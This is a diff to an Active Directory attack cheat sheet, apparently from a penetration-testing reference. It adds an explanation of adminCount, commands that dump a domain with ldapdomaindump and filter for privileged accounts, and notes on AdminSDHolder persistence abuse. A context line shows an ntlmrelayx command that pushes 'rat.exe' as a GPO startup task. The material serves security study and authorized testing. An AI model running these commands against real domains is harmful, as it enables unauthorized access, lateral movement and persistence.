@@ -1061,7 +1061,17 @@ ntlmrelayx -smb2support --no-smb-server --gpotato-startup rat.exe
 
 ### Dangerous Built-in Groups Usage
 
-If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object "CN=AdminSDHolder,CN=System," or set "adminCount" attribute to 0 for the required objec
+If you do not want modified ACLs to be overwrite every hour, you should change ACL template on the object "CN=AdminSDHolder,CN=System," or set "adminCount" attribute to 0 for the required object.
+
+>  The AdminCount attribute is set to 1 automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).
+
+
+Find users with `AdminCount=1`.
+
+```powershell
+python ldapdomaindump.py -u example.com\john -p pass123 -d ';' 10.100.20.1
+jq -r '.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]' domain_users.json
+``` 
 
 AdminSDHolder
 
@@ -1073,7 +1083,8 @@ or
 ```
 
 #### AdminSDHolder Abuse
-if you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp
+
+If you modify the permissions of **AdminSDHolder**, that permission template will be pushed out to all protected accounts automatically by SDProp.
 
 ```powershell
 # right to reset password for toto using the account titi
